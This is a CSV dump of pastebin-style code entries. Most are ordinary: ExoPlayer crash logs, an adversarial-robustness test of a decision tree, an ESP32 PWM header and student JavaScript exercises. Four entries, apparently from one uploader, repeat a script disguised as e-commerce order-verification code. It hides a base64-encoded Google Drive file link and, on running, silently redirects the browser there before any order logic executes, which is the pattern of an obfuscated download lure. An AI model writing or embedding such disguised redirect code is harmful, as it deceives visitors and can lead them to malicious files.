id,title,username,language,date,content
3AiSiqji,2025-04-07T15:14:41.620035,powerampache,PHP,Monday 7th of April 2025 08:14:41 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":57},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":252696821,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":230,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":319,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
NSdJ2QD9,2025-04-07T15:14:41.278869,powerampache,PHP,Monday 7th of April 2025 08:14:41 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":57},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":252696551,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":230,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":319,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
sE6SVGWB,Products.js,Epiphemeral,JavaScript,Monday 7th of April 2025 08:00:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51710/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ijA2Zapg,Market.js,Epiphemeral,JavaScript,Monday 7th of April 2025 07:29:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93231/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G5gTGmwi,Untitled,Epiphemeral,JavaScript,Monday 7th of April 2025 07:14:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74774/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YbTYywnw,adverserial,mayankjoin3,Python,Monday 7th of April 2025 07:09:22 AM CDT,"#!pip install adversarial-robustness-toolbox

import pandas as pd
import time
import psutil
import os
from sklearn.model_selection import StratifiedKFold
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import classification_report
import joblib
from sklearn.preprocessing import LabelEncoder
import numpy as np

# --- NEW IMPORTS for ART adversarial testing ---
from art.estimators.classification.scikitlearn import ScikitlearnDecisionTreeClassifier
from art.attacks.evasion import DecisionTreeAttack  # :contentReference[oaicite:0]{index=0}

# Step 1: Load the data
file_path = ""m3.csv""
df = pd.read_csv(file_path)

# Preprocessing
label_encoder = LabelEncoder()
X = df.drop(columns=['label'])
y = df['label']
X = X.apply(lambda col: label_encoder.fit_transform(col.astype(str)), axis=0, result_type='expand')

# Step 2: Initialize the Decision Tree model
clf = DecisionTreeClassifier(random_state=42)

# Step 3: Set up 2-Fold Cross-Validation
skf = StratifiedKFold(n_splits=2, shuffle=True, random_state=42)

fold = 1
for train_index, test_index in skf.split(X, y):
    print(f""\n=== Fold {fold} ==="")
    X_train, X_test = X.iloc[train_index], X.iloc[test_index]
    y_train, y_test = y.iloc[train_index], y.iloc[test_index]

    # Train
    start = time.time()
    clf.fit(X_train, y_train)
    train_time = time.time() - start
    print(f""Training time: {train_time:.4f}s"")

    # Predict (clean)
    start = time.time()
    preds = clf.predict(X_test)
    pred_time = time.time() - start
    print(f""Prediction time: {pred_time:.4f}s"")

    # Memory/CPU during prediction
    proc = psutil.Process(os.getpid())
    mem_before = proc.memory_info().rss / (1024**2)
    cpu_before = psutil.cpu_percent(interval=1)
    clf.predict(X_test)
    mem_after = proc.memory_info().rss / (1024**2)
    cpu_after = psutil.cpu_percent(interval=1)
    print(f""Memory delta: {mem_after - mem_before:.4f} MB"")
    print(f""CPU delta:    {cpu_after - cpu_before:.4f}%"")

    # Clean classification report
    print(""Clean Classification Report:"")
    print(classification_report(y_test, preds))

    # Save model size
    model_path = f""decision_tree_model_fold{fold}.pkl""
    joblib.dump(clf, model_path)
    size_mb = os.path.getsize(model_path) / (1024**2)
    print(f""Model size: {size_mb:.4f} MB"")

    # --- ADVERSARIAL TESTING BLOCK ---
    # 1. Wrap trained model for ART
    clip_min, clip_max = X_train.min().min(), X_train.max().max()
    art_classifier = ScikitlearnDecisionTreeClassifier(
        model=clf,
        clip_values=(clip_min, clip_max)
    )

    # 2. Set up the Decision Tree attack
    attack = DecisionTreeAttack(
        classifier=art_classifier,
        offset=0.001,
        verbose=False
    )

    # 3. Generate adversarial examples
    x_test_np = X_test.to_numpy()
    y_test_np = y_test.to_numpy()
    x_test_adv = attack.generate(x=x_test_np, y=y_test_np)

    # 4. Evaluate robust accuracy
    adv_preds = art_classifier.predict(x_test_adv).argmax(axis=1)
    robust_acc = (adv_preds == y_test_np).mean() * 100
    print(f""Robust accuracy under DecisionTreeAttack: {robust_acc:.2f}%"")
    fold+=1"
pE78JyA8,pwm,ces-engine,C++,Monday 7th of April 2025 07:04:14 AM CDT,"#ifndef PWM_CONTROLLER_H
#define PWM_CONTROLLER_H

#include ""settings.h""

class PWMController {
public:
    PWMController() {
        for (int i = 0; i < 4; i++) {  // Все 4 канала
            ledcSetup(pwmChannels[i], frequencies[i], getResolution(frequencies[i]));
            ledcAttachPin(pwmPins[i], pwmChannels[i]);
            ledcWrite(pwmChannels[i], 0);
        }
    }

    void setFrequency(int channel, int freq) {
        if (channel >= 0 && channel < 4 && freq >= 1 && freq <= 20000) {
            frequencies[channel] = freq;
            ledcSetup(pwmChannels[channel], freq, getResolution(freq));
        }
    }

    void setDuty(int channel, int duty) {
        if (channel >= 0 && channel < 4 && duty >= 0 && duty <= 100) {
            duties[channel] = duty;
            int pwmValue = map(duty, 0, 100, 0, (1 << getResolution(frequencies[channel])) - 1);
            ledcWrite(pwmChannels[channel], pwmValue);
        }
    }


private:
    int getResolution(int freq) {
        if (freq < 10) return 16;
        if (freq < 100) return 14;
        if (freq < 1000) return 12;
        return 10;
    }
};

#endif

///
///settings.h
///
#ifndef SETTINGS_H
#define SETTINGS_H

// Пины для ШИМ
const int pwmPins[] = {1, 2, 3, 10}; // GPIO
const int pwmChannels[] = {0, 1, 2, 3}; // Каналы LEDC

extern int frequencies[] = {1, 100, 1000, 1000}; 
extern int duties[] = {5, 25, 50, 100};
"
kATaM6ww,02.EcoEvent,Kamend1,JavaScript,Monday 7th of April 2025 07:02:02 AM CDT,"window.addEventListener(""load"", solve);

function solve() {
	let nextBtn = document.getElementById('next-btn');
	let previewList = document.getElementById('preview-list');
	let eventList = document.getElementById('event-list');
	let emailField = document.getElementById('email');
	let eventField = document.getElementById('event');
	let locationField = document.getElementById('location');
	
	nextBtn.addEventListener('click', function (e) {
		e.preventDefault();
		addEventToPreview();
	})
	
	function addEventToPreview () {

		if (!emailField.value || !eventField.value || !locationField.value) {
			return;
		}

		let eventItem = document.createElement('li');
		eventItem.classList.add('application');
		let eventArticle = document.createElement('article');

		let eventEmail = document.createElement('h4');
		eventEmail.textContent = emailField.value;
		eventArticle.appendChild(eventEmail);

		let eventPara = document.createElement('p');
		let paraTitle = document.createElement('strong');
		paraTitle.textContent = 'Event:';
		let eventBreak = document.createElement('br');
		eventPara.appendChild(paraTitle);
		eventPara.appendChild(eventBreak);
		eventPara.append(eventField.value);
		eventArticle.appendChild(eventPara);

		let locationPara = document.createElement('p');
		let paraTitleLoc = document.createElement('strong');
		paraTitleLoc.textContent = 'Location:';
		let eventBreakLoc = document.createElement('br');
		locationPara.appendChild(paraTitleLoc);
		locationPara.appendChild(eventBreakLoc);
		locationPara.append(locationField.value);
		eventArticle.appendChild(locationPara);

		eventItem.appendChild(eventArticle);

		let editBtn = document.createElement('button');
		editBtn.classList.add('action-btn');
		editBtn.classList.add('edit');
		editBtn.textContent = 'edit';
		editBtn.addEventListener('click', editEvent);
		eventItem.appendChild(editBtn);

		let applyBtn = document.createElement('button');
		applyBtn.classList.add('action-btn');
		applyBtn.classList.add('apply');
		applyBtn.textContent = 'apply';
		applyBtn.addEventListener('click', applyEvent);
		eventItem.appendChild(applyBtn);

		previewList.appendChild(eventItem);

		nextBtn.disabled = true;
		emailField.value = '';
		eventField.value = '';
		locationField.value = '';
	}

	function editEvent (event) {
		let editEventLi = event.currentTarget.parentElement;
		let editEmail = editEventLi.querySelector('article h4').textContent;
		let editEvent = editEventLi.querySelector('article p:first-of-type').textContent.split(':')[1];
		let editLocation = editEventLi.querySelector('article p:last-of-type').textContent.split(':')[1];

		emailField.value = editEmail;
		eventField.value = editEvent;
		locationField.value = editLocation;
		nextBtn.disabled = false;
		
		previewList.removeChild(editEventLi);
	}

	function applyEvent (event) {
		let applyEventLi = event.currentTarget.parentElement;
		let buttons = applyEventLi.querySelectorAll('button');

		for (let btn of buttons) {
			applyEventLi.removeChild(btn);
		}

		previewList.removeChild(applyEventLi);
		eventList.appendChild(applyEventLi);
	}
}"
v1w39TKW,01.Farm Management System,Kamend1,JavaScript,Monday 7th of April 2025 07:00:25 AM CDT,"function solve (commandArr) {
    class Farmer {
        constructor (name, location) {
            this.name = name;
            this.location = location;
            this.skills = []
        }
    }

    let farmerArr = [];
    let numFarmers = Number(commandArr[0]);

    for (let idx = 1; idx <= numFarmers; idx++) {
        let farmerStr = commandArr[idx];
        let [name, location, skills] = farmerStr.split(' ');
        let farmer = new Farmer(name, location);
        let skillArr = skills.split(',');

        for (let skill of skillArr) {
            farmer.skills.push(skill);
        }
        farmerArr.push(farmer);
    }

    for (let idx = numFarmers + 1; idx < commandArr.length; idx++) {
        currentCommandTokens = commandArr[idx].split(' / ');
        if (currentCommandTokens[0] === ""End"") {
            break;
        } else if (currentCommandTokens[0] === ""Execute"") {
            let [_, name, location, task] = currentCommandTokens;
            let currentFarmer = farmerArr.find(p => p.name === name);

            if (!currentFarmer) {
                continue;
            }

            if (currentFarmer.location !== location) {
                console.log(`${currentFarmer.name} cannot execute the task: ${task}.`);
                continue;
            }

            if (!currentFarmer.skills.includes(task)) {
                console.log(`${currentFarmer.name} cannot execute the task: ${task}.`);
                continue;
            }

            console.log(`${currentFarmer.name} has executed the task: ${task}!`)

        } else if (currentCommandTokens[0] === ""Change Area"") {
            let [_, name, location] = currentCommandTokens;
            let currentFarmer = farmerArr.find(p => p.name === name);
            
            if (!currentFarmer) {
                continue;
            }

            if (currentFarmer.location !== location) {
                currentFarmer.location = location;
                console.log(`${currentFarmer.name} has changed their work area to: ${location}`);
            }

        } else if (currentCommandTokens[0] === ""Learn Task"") {
            let [_, name, task] = currentCommandTokens;
            let currentFarmer = farmerArr.find(p => p.name === name);
            
            if (!currentFarmer) {
                continue;
            }

            if (currentFarmer.skills.includes(task)) {
                console.log(`${currentFarmer.name} already knows how to perform ${task}.`);
            } else {
                currentFarmer.skills.push(task);
                console.log(`${currentFarmer.name} has learned a new task: ${task}.`);
            }
        }
    }

    for (let farmer of farmerArr) {
        console.log(`Farmer: ${farmer.name}, Area: ${farmer.location}, Tasks: ${farmer.skills.sort().join(', ')}`);
    }

}"
e9vcK3L0,Products.js,Epiphemeral,JavaScript,Monday 7th of April 2025 06:58:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01811/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
